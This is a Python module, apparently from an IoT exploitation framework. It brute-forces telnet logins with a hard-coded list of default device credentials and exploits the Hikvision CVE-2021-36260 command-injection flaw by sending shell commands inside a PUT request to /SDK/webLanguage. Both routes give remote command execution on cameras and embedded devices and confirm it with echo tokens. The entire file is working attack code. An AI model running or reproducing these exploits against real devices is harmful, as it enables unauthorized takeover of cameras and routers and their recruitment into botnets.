"""IoT: Telnet-Defaults, Hikvision 2021-36260."""
from __future__ import annotations
import secrets
import time

from .exploit import RunResult

TEL_CREDS = [("root", "xc3511"), ("root", "vizxv"), ("root", "hi3518"), ("admin", "admin"), ("root", "root")]


class TelnetChannel:
    def __init__(self, host, port, user, pw):
        self.host, self.port, self.user, self.pw = host, port, user, pw

    def _conn(self):
        import telnetlib
        t = telnetlib.Telnet(self.host, self.port, timeout=4)
        try:
            time.sleep(0.4); t.read_very_eager()
        except Exception:
            pass
        t.write(self.user.encode() + b"\n")
        time.sleep(0.4)
        try:
            t.read_very_eager()
        except Exception:
            pass
        t.write(self.pw.encode() + b"\n")
        time.sleep(0.6)
        try:
            boot = t.read_very_eager().decode("utf-8", "replace")
        except Exception:
            boot = ""
        low = boot.lower()
        if "login invalid" in low or "login incorrect" in low or "password:" in low:
            t.close(); raise ValueError("login")
        if not any(ch in boot[-40:] for ch in ("#", "$", ">", "%")):
            t.close(); raise ValueError("noprompt")
        return t, boot

    def run(self, target, cmd, timeout=None, audit=None):
        import telnetlib
        try:
            t, _ = self._conn()
            tok = "IOT" + secrets.token_hex(3)
            t.write(f"echo {tok}; {cmd}; echo {tok}END\n".encode())
            time.sleep(0.8)
            data = t.read_until(f"{tok}END".encode(), timeout=timeout or 20).decode("utf-8", "replace")
            t.close()
            out = data.split(tok, 1)[-1].rsplit(tok + "END", 1)[0]
        except Exception as e:
            if audit:
                audit.write("vector", "rce_fail", getattr(target, "url", str(target)),
                            vector="telnet", cmd=cmd, error=type(e).__name__)
            return RunResult(False, "", type(e).__name__, 3)
        if audit:
            audit.write("vector", "rce_ok", getattr(target, "url", str(target)),
                        vector="telnet", cmd=cmd, head=out[:200])
        return RunResult(True, out)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout


def telnet_detect(t) -> bool:
    return t.port in (23, 2323)


def telnet_open(t, audit):
    for u, p in TEL_CREDS:
        ch = TelnetChannel(t.host, t.port, u, p)
        try:
            r = ch.run(t.url, "id")
            if not r.ok or "uid=" not in r.stdout:
                continue
            if ch.proof(t.url, "TELOK"):
                audit.write("vector", "opened", t.url, vector=f"telnet:{u}")
                return ch
        except Exception:
            continue
    return None


HK_URL = "/SDK/webLanguage"


def _hk_req(s, base, cmd):
    body = ('<?xml version="1.0" encoding="UTF-8"?><language>$(' + cmd + ')</language>')
    r = s.put(base + HK_URL, data=body,
              headers={"Content-Type": "application/xml"}, timeout=5)
    return r


def hik_detect(t) -> bool:
    srv = (t.server or "").lower()
    if "app-webs" not in srv and "hikvision" not in (t.extra.get("body") or "").lower():
        return False
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        r = _hk_req(requests.Session(), t.url, "echo HKTEST")
        return "HKTEST" in r.text
    except Exception:
        return False


def hik_open(t, audit):
    import requests, urllib3
    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False

    def fn(cmd):
        r = _hk_req(s, t.url, cmd)
        import re
        m = re.search(r"<language>(.*?)</language>", r.text, re.S)
        return (m.group(1) if m else r.text)[:4000]
    return TelnetChannel.__new__(TelnetChannel) if False else _Ch(fn)


class _Ch:
    def __init__(self, fn):
        self.fn = fn

    def run(self, target, cmd, timeout=None, audit=None):
        try:
            out = self.fn(cmd)
        except Exception as e:
            return RunResult(False, "", type(e).__name__, 3)
        if audit:
            audit.write("vector", "rce_ok", getattr(target, "url", str(target)),
                        vector="hikvision", cmd=cmd, head=(out or "")[:200])
        return RunResult(True, out or "")

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout
